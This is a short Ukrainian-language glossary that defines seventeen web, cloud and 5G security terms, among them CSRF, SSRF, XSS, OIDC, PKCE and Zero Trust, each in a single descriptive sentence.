**CSRF (Cross-Site Request Forgery)** — атака, що змушує автентифікованого користувача виконати несанкціоновані дії.

**DevSecOps** — методологія інтеграції практик безпеки в кожну фазу DevOps-циклу.

**IDOR (Insecure Direct Object Reference)** — різновид Broken Access Control, що дозволяє отримати доступ до ресурсів інших користувачів.

**IMDSv2 (Instance Metadata Service v2)** — безпечна версія сервісу метаданих AWS EC2 із токен-аутентифікацією.

**JWT (JSON Web Token)** — компактний самодостатній токен для безпечної передачі claims.

**mTLS (Mutual TLS)** — TLS із двосторонньою аутентифікацією клієнта та сервера.

**NEF (Network Exposure Function)** — мережева функція 5G, що надає зовнішній доступ до можливостей мережі.

**OIDC (OpenID Connect)** — протокол аутентифікації, побудований над OAuth 2.0.

**OAC (Origin Access Control)** — механізм обмеження доступу до S3-сховищ через CloudFront.

**PKCE (Proof Key for Code Exchange)** — розширення OAuth 2.0, що захищає від перехоплення authorization code.

**SBA (Service-Based Architecture)** — архітектура 5G, де мережеві функції взаємодіють через HTTP/2.

**SBC (Session Border Controller)** — елемент VoIP-мережі, що захищає SIP-інфраструктуру.

**Shift-Left Security** — концепція раннього залучення практик безпеки у SDLC.

**SSRF (Server-Side Request Forgery)** — атака, що змушує сервер виконувати запити до внутрішніх або зовнішніх ресурсів.

**WAF (Web Application Firewall)** — міжмережевий екран прикладного рівня для HTTP/HTTPS-трафіку.

**XSS (Cross-Site Scripting)** — атака впровадження шкідливого JavaScript-коду в веб-сторінки.

**Zero Trust** — концепція безпеки, за якої жодна мережа або ідентичність не є довіреними за замовчуванням.
